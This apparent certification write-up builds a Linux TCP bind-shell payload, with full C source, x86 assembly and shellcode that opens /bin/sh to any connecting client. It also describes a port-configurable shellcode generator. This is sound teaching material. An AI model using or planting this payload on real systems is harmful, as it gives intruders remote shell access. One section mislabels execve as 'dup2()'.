---
title: SLAE32 - Assignment 1 - TCP Bind Shell
date: 2021-03-14
tags:
- SLAE32
categories:
- SLAE Exam Assignments
- SLAE 32-bit
keywords:
    - Assembly
    - Bind Shell
---

The first assigment for the SLAE32 certification asks to write a TCP Bind Shell shellcode that binds to a port and then executes a shell on the incoming connection. Requirement is that port number should be easily configurable.
<!--more-->
## TCP Bind Shell in C
Let's first of all create a TCP bind shell in C that listens to port 4444. This is the code:
``` c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <unistd.h>

int main (){

	// Creating File Descriptor for the Socket	
	int socket_fd;
	socket_fd = socket(AF_INET, SOCK_STREAM, 0);

	// Binding the socket to server address
	struct sockaddr_in server_address; 
	server_address.sin_family = AF_INET;
	server_address.sin_port = htons(4444);
	server_address.sin_addr.s_addr = INADDR_ANY;

	bind(socket_fd, (struct sockaddr *)&server_address, sizeof(server_address)); 

	// Activate listening on the socked
	listen(socket_fd, 0); 

	// Accept new connections on the socket
	int connection_fd;
	connection_fd = accept(socket_fd, NULL, NULL);

	// Redirect STDIN(0), STDOUT(1) and STDERR(2) on Connection_FD
	dup2(connection_fd, 0); 
	dup2(connection_fd, 1);
	dup2(connection_fd, 2);

	// Invoking EXECVE
	execve("/bin/sh", NULL, NULL);

	// Return
	return 0;
}
```
Trying the shell, we see that it is working as intended:
![Bind Shell skeleton in C](/writeups/img/slae1-01.png)

## Porting the C code to Assembly
Now, we need to port the C code into Assembly code. Basically, we need to replicate the following syscalls:
* [socket](https://man7.org/linux/man-pages/man2/socket.2.html)
* [bind](https://man7.org/linux/man-pages/man2/bind.2.html)
* [listen](https://man7.org/linux/man-pages/man2/listen.2.html)
* [accept](https://man7.org/linux/man-pages/man2/accept.2.html)
* [dup2](https://man7.org/linux/man-pages/man2/dup.2.html)
* [execve](https://man7.org/linux/man-pages/man2/execve.2.html)
* [exit](https://man7.org/linux/man-pages/man2/exit.2.html)

In the `Bind-Shell-StaticParams.nasm` file the original C lines have been kept to provide references and make it more readable at a first glance.  

Let's start and set the registers to zero:
```
; Zeroing the registers	
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
```

### socket()
The `socket()` function (syscall 359) creates an endpoint for communication. The prototype for this function is defined as follows:
```
int socket(int domain, int type, int protocol);
```
The parameters need to be put in appropriate registers:
* ebx will contain _domain_, set to 2 for "AF_INET" (IPv4 Internet protocols)
* ecx will contain _type_, set to 1 for "SOCK_STREAM" (sequenced, reliable, two-way, connection-based byte streams)
* edx will contain _protocol_, set to 0 (single protocol)

Code implementation is the following:
```
;// Creating File Descriptor for the Socket	
;socket_fd = socket(AF_INET, SOCK_STREAM, 0);
mov ax, 0x167		; #define __NR_socket 359
mov bl, 0x2			; AF_INET = 2
mov cl, 0x1			; SOCK_STREAM = 1
int 0x80			; FD will be stored in eax
```
The return value of the function is the file descriptor that refers to the communication endpoint that has been created, and it will be stored into eax. We will need it for the next syscalls, to we need to copy it somewhere. I have choosen to copy it into edi.
```
mov edi, eax		; Copying socket_fd into edi
xor eax, eax		; Cleaning eax
```

### bind()
The `bind()` function (syscall 361) binds a name to a socket. The prototype for this function is defined as follows:
```
int bind(int sockfd, const struct sockaddr *addr,
         socklen_t addrlen);
```
In order to execute the _bind_ we will need to create the *sockaddr_in* structure in memory which will then be passed to the bind. The *sockaddr_in* prototype is defined as follows:
```
struct sockaddr_in {
   short int            sin_family;
   unsigned short int   sin_port;
   struct in_addr       sin_addr;
   unsigned char        sin_zero[8];
};
```
As we will need to provide also the lenght of the structure in memory, let's first save the current esp into edx:
```
;// Binding the socket to server address
;struct sockaddr_in server_address; 
mov edx, esp		; Saving current SP in edx (will be used to compute size of struct)
```
We need now to push the attributes of sockaddr_in onto the stack *in reverse order*, therefore we are:
* Pushing 8 bytes set to zero and then push the listen address 0.0.0.0 (another 4 zero bytes):
  ```
  ;server_address.sin_addr.s_addr = INADDR_ANY;
	push eax	
	push eax
	push eax		; Push 0x0 (INADDR_ANY)
  ```
* Pushing the port to bind. We are using port 4444 which is 0x115c Hex. Let's not forget we are using little-endian system, therefore we will push 0x5c11:
  ```
	;server_address.sin_port = htons(4444);
	push word 0x5c11	; DEC 4444 -> HEX 0x115c 
  ```

* Pushing *sin_family* argument, which is 2 for AF_INET:
  ```
	;server_address.sin_family = AF_INET;
	push word 0x02		; AF_INET = 2
  ```

Now that we have created the *sockaddr_in* structure in memory we can populate the registers with parameters for the bind() syscall:
* eax is set to 0x169 (DEC 361 which is the syscall number)
* ebx is set with the file descriptor from socket() syscall (stored in edi)
* ecx is set to pointer to the structure in memory (top of the Stack)
* edx, which was set to the top of the stack before creating the *sockaddr_in* structure in memory, is now set to the actual size of the structure by subtracting the new address of the top of the Stack.
```
;bind(socket_fd, (struct sockaddr *)&server_address, sizeof(server_address)); 
mov ax, 0x0169		; #define __NR_bind 361
mov ebx, edi		; ebx = socket_fd
mov ecx, esp		; ecx = TOS (Pointer to server_address struct)
sub edx, ecx		; edx = (TOS Before struct) - TOS = size of struct
int 0x80
```


### listen()
The `listen()` function (syscall 363) listen for connections on a socket. The prototype for this function is defined as follows:
```
int listen(int sockfd, int backlog);
```
The parameters need to be put in appropriate registers:
* ebx is set with the file descriptor from socket() syscall (stored in edi)
* ecx it set to 0 for the _backlog_ parameter
```
;// Activate listening on the socked
;listen(socket_fd, 0); 
xor eax, eax		; eax = 0
mov ax, 0x016b		; #define __NR_listen 363
mov ebx, edi		; ebx = socket_fd
xor ecx, ecx		; ecx = 0
int 0x80
```

### accept()
The `accept()` function (syscall 364) accepts a connection on a socket. The prototype for this function is defined as follows:
```
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```
The parameters need to be put in appropriate registers:
* ebx is set with the file descriptor from socket() syscall (stored in edi)
* ecx is set to 0 for the _addr_ parameter, not to store details of the peer socket
* edx is set to 0 in alignment with choice for _addr_ parameter (_When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL_)

```
;// Accept new connections on the socket
;int connection_fd;
;connection_fd = accept(socket_fd, NULL, NULL);
xor eax, eax		; eax = 0
mov ax, 0x16C		; #define __NR_accept4 364
mov ebx, edi		; ebx = socket_fd
xor ecx, ecx		; ecx = 0
xor edx, edx		; edx = 0
int 0x80		; connection_fd will be stored in eax
```
The return value of the function is a new file descriptor that refers to the first connection request on the queue of pending connections for the listening socket, and it will be stored into eax. We will need it for the next syscalls, to we need to copy it somewhere. I have choosen to copy it into esi.
```
mov esi, eax		; esi = connection_fd
```

### dup2()
The `dup2()` function (syscall 63) duplicates a file descriptor. The prototype for this function is defined as follows:
```
int dup2(int oldfd, int newfd);
```
We need to execute this syscall 3 times, to duplicate the 3 file descriptors (STDIN, STDOUT and STDERR) to the file descriptor related to the connection socket created in the previous syscall and stored in esi.

Given that we need to perform the same action 3 times, we are then using a loop with ecx as both counter and argument pointing to the 3 standard file descriptors:
```
	;// Redirect STDIN(0), STDOUT(1) and STDERR(2) on Connection_FD
	;dup2(connection_fd, 0); 
	;dup2(connection_fd, 1);
	;dup2(connection_fd, 2);

	xor ecx, ecx		; ecx = 0
	mov cl, 0x3		; will need to loop 3 times. 	
_dup_loop:
	xor eax, eax
	mov al, 0x3f		; #define __NR_dup2 63
	mov ebx, esi		; ebx = connection_fd
	dec cl			; decrease ecx to get actual FD
	int 0x80
	jnz _dup_loop
```
### execve()
The `dup2()` function (syscall 11) executes a program. The prototype for this function is defined as follows:
```
int execve(const char *pathname, char *const argv[],
           char *const envp[]);
```
We will use it in order to start `/bin//sh` (additional '/' is not affecting the command, it has just been added for padding purposes), therefore we need to push it (along with NULL terminator) on the stack. Argument _envp_ (edx) will be a pointer to a null dword and _argv_ (ecx) will be a pointer to the address of _pathname_ 

```
;// Invoking EXECVE
;execve("/bin/sh", NULL, NULL);
xor eax, eax		; eax = 0

push eax		; push eax (0x0 as null terminator)
push 0x68732f2f
push 0x6e69622f		; Push '/bin//sh' (reverse order) onto the stack
mov ebx, esp		; ebx = pointer to TOS (string '/bin//sh')

push eax		; push 0x0
mov edx, esp		; edx = pointer to TOS (null)

push ebx		; push ebx (pointer to string '/bin//sh')
mov ecx, esp		; ecx = pointer to TOS

mov al, 0x0b		; #define __NR_execve 11
int 0x80
```

### exit()
The exit function is very simple and known, its code (which needs to be set into eax) is 1. This is the code used to replicate it in our Assembly code:
```
	;// Return
	;return 0;
	xor eax, eax
	xor ebx, ebx
	inc eax
	int 0x80
```

### Test run
The Assembly code has been compiled and executed; it worked as intended!
![Bind Shell skeleton in Assembly](/writeups/img/slae1-02.png)


## Port configuration utility
As of now, the bind port has been hardcoded into the code, but the assignment asks for an 'easy-configurable port', therefore I have created a small Python3 script which generates the complete shellcode. 

I have generated the shellcode from the compiled nasm file and divided it into two parts (the shellcode before port bytes and the shellcode after port bytes). The `Bind-Shell-Creator.py` Python script requires a parameter that is the desired port number. It then transforms the port in the appropriate _socket_ format and then prints on the screen:
* the selected port in Hex
* the selected port in reversed-Hex (ready for a push on the stack)
* the complete shellcode with the selected port

![Bind Shell skeleton in C](/writeups/img/slae1-03.png)

In order to test the script, I have first loaded the generated shellcode into a copy of the encrypter utility from Assignment 7 and encrypted it with password 'testme':
![Bind Shell skeleton in C](/writeups/img/slae1-04.png)

The encrypted string has been copied to the decrypt-exec utility and then executed. As shown in the screenshot, the selected port (8080) has been applied and the shell has executed successfully:
![Bind Shell skeleton in C](/writeups/img/slae1-05.png)



<!-- SLAE32 Disclaimer -->
_________________
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/).

**Student ID**: `SLAE - 1547`  
**GitHub repository**: [https://github.com/andrea-perfetti/SLAE32-Exam](https://github.com/andrea-perfetti/SLAE32-Exam)

This assignment has been written on a Kali Linux 2021.1 x86 virtual machine:
```
┌──(kali㉿kali)-[~]
└─$ uname -a 
Linux kali 5.10.0-kali3-686-pae #1 SMP Debian 5.10.13-1kali1 (2021-02-08) i686 GNU/Linux
```